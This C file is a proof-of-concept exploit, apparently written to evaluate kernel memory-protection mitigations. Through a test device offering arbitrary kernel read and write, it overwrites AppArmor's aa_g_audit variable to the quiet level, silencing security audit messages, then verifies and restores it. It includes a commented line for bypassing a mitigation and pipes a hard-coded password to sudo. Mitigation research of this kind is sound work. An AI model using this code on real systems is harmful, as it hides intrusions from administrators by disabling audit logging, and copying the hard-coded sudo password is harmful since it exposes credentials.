// FZY: Add a simple apparmor log level downgrading proof of concept that overwrites aa_g_audit from 0 (normal) to 2 (quite)

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define FIELD_SIZE 4

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)

void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

static unsigned int orig_aa_g_audit;

void verify_aa_g_audit_addr(int fd, unsigned long aa_g_audit_addr) {
  printf("[+] aa_g_audit address: 0x%lx\n", aa_g_audit_addr);

  // Get the current value
  unsigned int current_value;
  arb_read(fd, aa_g_audit_addr, &current_value, FIELD_SIZE);
  printf("[+] Current aa_g_audit value: %u\n", current_value);
  orig_aa_g_audit = current_value;
}

// The sysfs parameter rejects most writes, so the arbitrary write is also the
// only way back.
void restore_aa_g_audit(int fd, unsigned long aa_g_audit_addr) {
  unsigned int readback;

  arb_write(fd, aa_g_audit_addr, &orig_aa_g_audit, FIELD_SIZE);
  arb_read(fd, aa_g_audit_addr, &readback, FIELD_SIZE);
  if (readback == orig_aa_g_audit)
    printf("[+] aa_g_audit restored to %u\n", orig_aa_g_audit);
  else
    printf("[-] aa_g_audit restore failed, now: %u\n", readback);
}

void overwrite_aa_g_audit(int fd, unsigned long aa_g_audit_addr) {
  printf("[+] Overwriting aa_g_audit at 0x%lx\n", aa_g_audit_addr);

  // AUDIT_QUIET, quiet all messages
  unsigned int new_value = 2;
  printf("[+] Writing value %u to address 0x%lx\n", new_value, aa_g_audit_addr);
  arb_write(fd, aa_g_audit_addr, &new_value, FIELD_SIZE);
  printf("[+] Write completed\n");
  
  unsigned int verify_value;
  arb_read(fd, aa_g_audit_addr, &verify_value, FIELD_SIZE);
  printf("[+] New aa_g_audit value after write: %u\n", verify_value);

  if (verify_value != new_value) {
    printf("[-] WARNING: Write verification failed! Expected %u but got %u\n", 
           new_value, verify_value);
  } else {
    printf("[+] aa_g_audit successfully overwritten to %u!\n", new_value);
  }
}

// Read the AppArmor audit module parameter, which is what aa_g_audit backs.
// Returns 0 on success and fills buf with the value ("normal", "quiet", ...).
int query_audit_param(char *buf, size_t len) {
  FILE *fp;

  memset(buf, 0, len);

  // Use sh -c to properly pipe the password to sudo
  fp = popen("sh -c 'echo debian | sudo -S cat /sys/module/apparmor/parameters/audit 2>/dev/null'", "r");
  if (!fp)
    return -1;

  if (fgets(buf, len, fp) == NULL) {
    pclose(fp);
    return -1;
  }
  pclose(fp);

  buf[strcspn(buf, "\n")] = 0;
  return 0;
}

static char audit_param_before[128];

// The module parameter as it reads before the overwrite, for the before/after
// comparison verify_exploit() prints.
void snapshot_audit_param(void) {
  printf("[+] Module parameter before overwrite:\n");
  if (query_audit_param(audit_param_before, sizeof(audit_param_before)) < 0) {
    printf("[-] Failed to read /sys/module/apparmor/parameters/audit\n");
    strcpy(audit_param_before, "(unreadable)");
    return;
  }
  printf("[+]   /sys/module/apparmor/parameters/audit = %s\n",
         audit_param_before);
}

void verify_exploit() {
  printf("[+] Checking if exploit worked...\n");

  printf("[+] Current aa_g_audit value from sysfs:\n");

  char buf[128];

  if (query_audit_param(buf, sizeof(buf)) < 0)
    return;

  printf("[+]   /sys/module/apparmor/parameters/audit = %s\n", buf);
  printf("[+] Module parameter before -> after: %s -> %s\n",
         audit_param_before, buf);

  if (strcmp(buf, "quiet") == 0) {
      printf("Audit mode is AUDIT_QUIET now, which would quiet all messages\n");
  } else {
      printf("Error output: %s\n", buf);
  }
  return;
}

int main(int argc, char *argv[]) {
  printf("[+] Privilege escalation PoC by overwriting aa_g_audit\n");

  if (argc != 3) {
    printf("Usage: %s <mode> <aa_g_audit_addr>\n", argv[0]);
    printf("\t- mode: 0 for no protection, 1 for Sensitivity Tag, "
           "2 for Sensitivity and TypeID Tag.\n");
    printf("\t- aa_g_audit_addr: nm vmlinux | grep aa_g_audit\n");
    return 1;
  }

  printf("[+] Opening /dev/arb_rw...\n");

  int arbrw_dev_fd = open("/dev/arb_rw", O_RDWR);
  if (arbrw_dev_fd < 0) {
    perror("open");
    exit(1);
  }

  printf("[+] Device opened successfully\n");
  
  int mode = atoi(argv[1]);
  if (mode < 0 || mode > 2) {
    printf("Invalid mode. Use 0 for no protection, "
      "1 for protection with Sensitivity Tag, "
      "and 2 for protection with Sensitivity and TypeID Tag.\n");
    close(arbrw_dev_fd);
    return 1;
  }

  unsigned long aa_g_audit_addr = strtoul(argv[2], NULL, 16);
  
  if (mode != 0) {
    // Get the address of aa_g_audit from the kernel with arb_read, because we store the address of aa_g_audit in the global variable and store the string content at unpredictable address
    arb_read(arbrw_dev_fd, aa_g_audit_addr, &aa_g_audit_addr, sizeof(unsigned long));

    printf("[+] aa_g_audit address from kernel memory: 0x%lx\n", aa_g_audit_addr);

    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
    // aa_g_audit_addr = aa_g_audit_addr | 0xFFFF000000000000;
  }
  
  verify_aa_g_audit_addr(arbrw_dev_fd, aa_g_audit_addr);

  snapshot_audit_param();

  overwrite_aa_g_audit(arbrw_dev_fd, aa_g_audit_addr);

  verify_exploit();

  restore_aa_g_audit(arbrw_dev_fd, aa_g_audit_addr);

  close(arbrw_dev_fd);
  
  return 0;
}